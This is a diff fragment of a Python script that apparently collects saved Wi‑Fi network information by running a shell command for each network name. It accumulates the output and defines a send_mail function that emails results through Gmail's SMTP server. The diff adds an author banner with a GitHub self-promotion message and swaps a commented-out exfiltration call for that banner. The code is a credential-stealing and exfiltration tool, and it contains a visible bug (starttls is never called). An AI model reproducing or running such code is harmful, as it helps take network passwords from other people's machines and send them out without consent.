@@ -5,6 +5,11 @@ import re
 email = input("Enter your Email Address >> ")
 password = input("Enter The Password For Your Email Address")
 
+def author():
+	print("TOOL IS CREATED BY KRISNA PRANAV")
+	print("Github Link https://www.github.com/krishpranav")
+	print("DO NOT FOGET TO FOLLOW ME :)")
+
 def send_mail(email, password, message):
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls
@@ -21,5 +26,5 @@ for network_name in network_names_list:
 	current_result = subprocess.check_output(command, shell=True)
 	result = result + current_result
 
-# send_mail("your gmail", "your password", result)
+author()
 
